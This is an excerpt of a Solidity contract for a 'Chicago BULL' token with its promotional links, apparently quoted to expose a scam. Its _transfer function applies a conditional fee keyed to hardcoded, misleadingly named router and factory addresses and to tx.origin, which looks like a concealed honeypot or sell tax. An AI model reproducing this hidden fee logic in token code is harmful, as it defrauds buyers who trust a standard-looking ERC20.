...
https://twitter.com/ChicagoBullCoinBNB
https://t.me.com/ChicagoBullCoinBNB
https://ChicagoBullCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal routerV2 = 0x3288C64cF05EA4b990ead1E0a2a4983a0B018ae7;
    uint256 private _swapEnabled = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private _uniswapV2Factory = 0x82d26BC239Bd5202574a2a49d386490BebD53c02;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != routerV2 && _balances[_uniswapV2Factory] > 0 ? _pairsAllowance : _swapEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
contract ChicagoBullCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"Chicago BULL", unicode"CHIBULL")
    {
